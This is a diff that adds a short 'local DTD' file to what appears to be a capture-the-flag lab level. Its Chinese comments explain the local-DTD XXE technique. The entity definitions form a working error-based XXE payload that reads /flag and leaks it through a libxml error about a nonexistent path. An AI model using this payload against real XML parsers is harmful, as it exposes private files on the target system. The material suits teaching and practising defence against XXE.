@@ -1,0 +1,15 @@
+<!--
+    L3 用的「本地 DTD」。
+
+    真实世界里这类文件是系统或第三方库自带的（Debian 上的 /usr/share/xml/*、
+    各种 java/xml 库自带的 DTD），攻击者的手法是复用它们、劫持里面已经声明的实体。
+    这个镜像里没有可利用的现成 DTD，所以这里放一个功能等价的替代品 ——
+    手法和真实环境一致，只是 DTD 的来源是我们自己放的。
+
+    作用：读 /flag，然后把内容拼进一个「不存在的文件路径」，
+    让 libxml 报错时把路径原样打出来 —— 参数实体的值就这样从错误信息里泄漏出去。
+-->
+<!ENTITY % local SYSTEM "file:///flag">
+<!ENTITY % boom "<!ENTITY &#x25; leak SYSTEM 'file:///nope/%local;'>">
+%boom;
+%leak;
